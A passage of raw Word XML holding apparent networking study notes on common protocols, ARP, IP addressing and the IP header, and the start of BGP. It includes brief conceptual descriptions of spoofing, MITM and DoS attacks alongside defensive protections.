    </w:p>
    <w:p w14:paraId="78BD41EB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HyperText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Transfer Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F96C524" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTPS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HyperText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Transfer Protocol Secure)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2615B7CB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SMTP (Simple Mail Transfer Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A38A5B0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POP3 (Post Office Protocol 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A391A97" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IMAP (Internet Messaging Access Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBE01E6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FTP (File Transfer Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235BB5BD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1057DDB1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>TelNet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="15E09476" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS (Domain Name System)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AC3F71" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LDAP (Lightweight Directory Access Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620AC451" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc208408473"/>
      <w:r>
        <w:t>Address Resolution Protocol</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="521A3157" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ARP is a Layer 2 / Layer 3 protocol (it sits between the Data Link Layer and Network Layer) used to map an IP address (logical address) to a MAC address (physical address) on a local area network (LAN).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E3AF3F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc208408474"/>
      <w:r>
        <w:t>How ARP works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="26C6D928" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A host wants to send a packet to another host in the same subnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3585A222" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It checks its ARP cache (local table of IP &lt;-&gt; MAC mapping)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A9BA95" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>If mapping not found:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2467C3DE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Sends an ARP Request (broadcast): “Who has 192.168.1.0?”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD1D80B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>All devices on LAN receives the broadcast</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C59E0E7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The device with that IP replies with an ARP Reply (unicast): “192.168.1.0 is at MAC AA:BB:CC:DD:EE:FF”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1605FD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The sender updates its ARP cache and forwards the packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF08F5B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc208408475"/>
      <w:r>
        <w:t>Types of ARP:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="69B864BB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Normal ARP Request/Reply – Standard resolution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FD4F7F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gratuitous ARP – A host announces its own IP &lt;-&gt; MAC (used for detecting IP conflicts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDF94C0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Proxy ARP – A router answers ARP requests on behalf of another host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155A6CE2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reverse ARP (RARP) – Legacy, maps MAC -&gt; IP (replaced by DHCP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490FD97E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Command on Linux:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001783E1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212AFEB2" w14:textId="135A435B" w:rsidR="00B830E7" w:rsidRDefault="004D43F7" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc208408476"/>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00353410">
        <w:t>ecurity Issues &amp; Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="0979AFBC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ARP Spoofing/Poisoning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5781D6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker sends fake ARP replies, binding their MAC to the victim’s IP or gateway’s IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641CAD9B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Redirects traffic through attacker -&gt; enables MITM attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3CFC5C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (Denial of Service)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAA223A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Poisoning ARP tables can make devices unable to reach the gateway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EFC583" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73792680" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Using ARP poisoning to sniff credentials, cookies, or even inject malicious traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C6FCB5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc208408477"/>
      <w:r>
        <w:t>Internet Protocol</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="31D95723" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IP is a Layer 3 (Network Layer) protocol responsible for addressing, routing, and delivering packets from a source host to a destination host across networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F0BA12" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It’s connectionless and unreliable by itself — meaning no guarantee of delivery, order, or integrity. That’s why TCP/UDP ride on top of IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231F3502" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc208408478"/>
      <w:r>
        <w:t>Main Responsibilities:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="7F4159ED" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Logical Addressing → Assigns IP addresses (IPv4/IPv6).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0923CEE3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Routing → Determines best path through routers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC4A29F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Encapsulation → Wraps data into IP packets for transmission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9F8487" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fragmentation/Reassembly → Splits large packets if they exceed MTU (Maximum Transmission Unit).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5149D1" w14:textId="27C8688C" w:rsidR="00D75FD2" w:rsidRPr="00BC35DD" w:rsidRDefault="00353410" w:rsidP="00BC35DD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc208408479"/>
      <w:r>
        <w:t>IP Header</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="429986ED" w14:textId="65C623CA" w:rsidR="00D75FD2" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3243EA63" wp14:editId="16008B3C">
            <wp:extent cx="5511165" cy="3124200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1612817263" name="Picture 5" descr="IP Hea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P Header Detai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0783" cy="3140990"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D1C145" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc208408480"/>
      <w:r>
        <w:t>Types:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="16F0594C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IPv4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9E7B5F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>32-bit addressing → ~4.3 billion unique addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EFBF48" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Example: 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8A09D7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Written in dotted-decimal format (4 octets).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA87164" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Header size: 20–60 bytes (variable).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721305EE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Uses broadcast, multicast, unicast.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED77E5C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Widely deployed, but address exhaustion forced workarounds like NAT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1775DA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>IPv6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B10EB48" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">128-bit addressing → ~340 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>undecillion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> addresses (basically unlimited).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531F271C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Example: 2001:0db8:85a3::7334</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2C440C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Written in hexadecimal colon-separated format (8 groups of 16 bits).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563B6942" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Header size: 40 bytes (fixed).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4041EE34" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Uses unicast, multicast, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>anycast</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ( no broadcast).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5C29F1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="004D43F7">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Designed to replace IPv4 and eliminate the need for NAT.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C1CF5A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc208408481"/>
      <w:r>
        <w:t>Security Issues with IP:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="443C9081" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">IP Spoofing: Attacker forges source IP → used in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, MITM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6280726A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fragmentation Attacks: Malicious fragmentation to evade firewalls/IDS (e.g., Teardrop attack).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B22645" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Routing Attacks: Manipulating routes (e.g., BGP hijacking, ICMP redirect misuse).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71731621" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Amplification: Using spoofed IPs with protocols like NTP/DNS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6724F3EF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc208408482"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="0FAF1316" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ingress/Egress Filtering – Prevent spoofed packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7BDEC0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Firewalls / IDS / IPS – Detect anomalies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1D4897" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>IPSec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – Provides encryption, authentication, integrity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37767E5B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Router ACLs – Block malicious traffic at edge.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DA370F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc208408483"/>
      <w:r>
        <w:t>Border Gateway Protocol (BGP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="697F17A8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>BGP (Border Gateway Protocol) is a Layer 3 (Network Layer) path-vector routing protocol defined in RFC 4271. It is the protocol that makes the Internet work, exchanging routing and reachability information between Autonomous Systems (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ASes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBB86BC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc208408484"/>
      <w:r>
        <w:t>How BGP Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="742CBA0D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Neighbor Establishment: BGP peers establish a TCP session on port 179.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EA8A2B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Exchange of Routing Information: Routers exchange BGP Update messages containing route prefixes, next-hop, AS path, and attributes.</w:t>
      </w:r>
    </w:p>
